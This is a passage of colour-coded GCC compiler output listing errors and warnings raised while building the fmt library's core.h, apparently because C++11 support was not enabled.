 struct result_of<F(Args...)>
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::result_of<typename std::remove_reference<F>::type(Args...)> {};
[01;32m[K                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:256:29:[m[K [01;31m[Kerror: [m[K‘[01m[Kmake_unsigned[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 FMT_CONSTEXPR typename std::make_unsigned<Int>::type to_unsigned(Int value) {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:256:42:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
 FMT_CONSTEXPR typename std::make_unsigned<Int>::type to_unsigned(Int value) {
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:264:27:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   buffer(const buffer&) = delete;
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:265:35:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const buffer&) = delete;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:385:19:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename... T>
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
 struct is_constructible : std::is_constructible<T...> {};
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kfmt::v5::basic_string_view<Char> fmt::v5::to_string_view(const std::basic_string<_CharT, _Traits, _Alloc>&)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:511:3:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
   return {s.data(), s.size()};
[01;32m[K   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
 struct is_compile_string : std::is_base_of<compile_string, S> {};
[01;32m[K                                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:533:23:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename S, FMT_ENABLE_IF(is_compile_string<S>::value)>
[01;32m[K                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:533:23:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename S, FMT_ENABLE_IF(is_compile_string<S>::value)>
[01;32m[K                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kvoid fmt::v5::basic_parse_context<Char, ErrorHandler>::advance_to(fmt::v5::basic_parse_context<Char, ErrorHandler>::iterator)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:566:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kto_unsigned[m[K’ is not a member of ‘[01m[Kfmt::v5::internal[m[K’
     format_str_.remove_prefix(internal::to_unsigned(it - begin()));
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::integral_constant<bool, !std::is_arithmetic<T>::value &&
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:612:67:[m[K [01;31m[Kerror: [m[Kexpected class-name before ‘[01m[K{[m[K’ token
 template <typename T> struct no_formatter_error : std::false_type {};
[01;32m[K                                                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:617:30:[m[K [01;31m[Kerror: [m[K‘[01m[Kfmt::v5::internal::no_formatter_error<T>::value[m[K’ is not a type
       no_formatter_error<T>::value,
[01;32m[K                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:618:7:[m[K [01;31m[Kerror: [m[Kexpected identifier before string constant
       "don't know how to format the type, include fmt/ostream.h if it provides "
[01;32m[K       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:618:7:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before string constant
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:619:42:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kstatic_assert[m[K’ with no type [-fpermissive]
       "an operator<< that should be used");
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::integral_constant<
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:20:[m[K [01;31m[Kerror: [m[K‘[01m[Kto_string_view[m[K’ is not a type
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K<[m[K’ token
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kdecltype[m[K’ with no type [-fpermissive]
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:35:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K;[m[K’ at end of member declaration
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:642:20:[m[K [01;31m[Kerror: [m[K‘[01m[Kresult[m[K’ has not been declared
   typedef typename result::char_type type;
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const signed char*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:19:[m[K [01;31m[Kerror: [m[K‘[01m[Kis_same[m[K’ is not a member of ‘[01m[Kstd[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:32:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[Kchar[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:48:[m[K [01;31m[Kerror: [m[K‘[01m[K::value[m[K’ has not been declared
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:48:[m[K [01;36m[Knote: [m[Ksuggested alternative:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:701:35:[m[K [01;36m[Knote: [m[K  ‘[01m[Kfmt::v5::internal::value[m[K’
 template <typename Context> class value {
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:728:46:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
                   "incompatible string types");
[01;32m[K                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:728:46:[m[K [01;36m[Knote: [m[K(if you use ‘[01m[K-fpermissive[m[K’, G++ will accept your code, but allowing the use of an undeclared name is deprecated)
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const unsigned char*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:19:[m[K [01;31m[Kerror: [m[K‘[01m[Kis_same[m[K’ is not a member of ‘[01m[Kstd[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:32:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[Kchar[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:48:[m[K [01;31m[Kerror: [m[K‘[01m[K::value[m[K’ has not been declared
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:48:[m[K [01;36m[Knote: [m[Ksuggested alternative:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:701:35:[m[K [01;36m[Knote: [m[K  ‘[01m[Kfmt::v5::internal::value[m[K’
 template <typename Context> class value {
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:733:46:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
                   "incompatible string types");
[01;32m[K                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const T&)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:26:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
         T, typename std::conditional<
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:37:[m[K [01;31m[Kerror: [m[Kexpected template-argument before ‘[01m[K<[m[K’ token
         T, typename std::conditional<
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:37:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected class-name before ‘[01m[K;[m[K’ token
                internal::fallback_formatter<T, char_type>>::type>;
[01;32m[K                                                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K::[m[K’ before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected identifier before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:802:9:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typedef std::conditional<sizeof(long) == sizeof(int), int, long long>::type
[01;32m[K         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[K‘[01m[Klong_type[m[K’ was not declared in this scope
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:25:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:39:[m[K [01;31m[Kerror: [m[Ktemplate argument 2 is invalid
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:804:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(long) == sizeof(int) ? int_type : long_long_type), long,
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kint fmt::v5::internal::make_value(long int)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected type-specifier before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[K‘[01m[Klong_type[m[K’ was not declared in this scope
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:39:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K;[m[K’ token
     return static_cast<ValueType>(val);                           \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:804:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(long) == sizeof(int) ? int_type : long_long_type), long,
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:806:9:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typedef std::conditional<sizeof(unsigned long) == sizeof(unsigned), unsigned,
[01;32m[K         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kulong_type[m[K’ was not declared in this scope
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:25:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:39:[m[K [01;31m[Kerror: [m[Ktemplate argument 2 is invalid
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:808:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(unsigned long) == sizeof(unsigned) ? uint_type
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kint fmt::v5::internal::make_value(long unsigned int)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected type-specifier before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kulong_type[m[K’ was not declared in this scope
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:39:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K;[m[K’ token
     return static_cast<ValueType>(val);                           \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:808:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(unsigned long) == sizeof(unsigned) ? uint_type
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:819:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(std::is_same<typename C::char_type, Char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:819:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(std::is_same<typename C::char_type, Char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:825:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<typename C::char_type, char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:825:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<typename C::char_type, char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:863:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<T, typename C::char_type>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:863:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<T, typename C::char_type>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kvoid fmt::v5::internal::make_value(const T*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:865:76:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
   static_assert(!sizeof(T), "formatting of non-void pointers is disallowed");
[01;32m[K                                                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
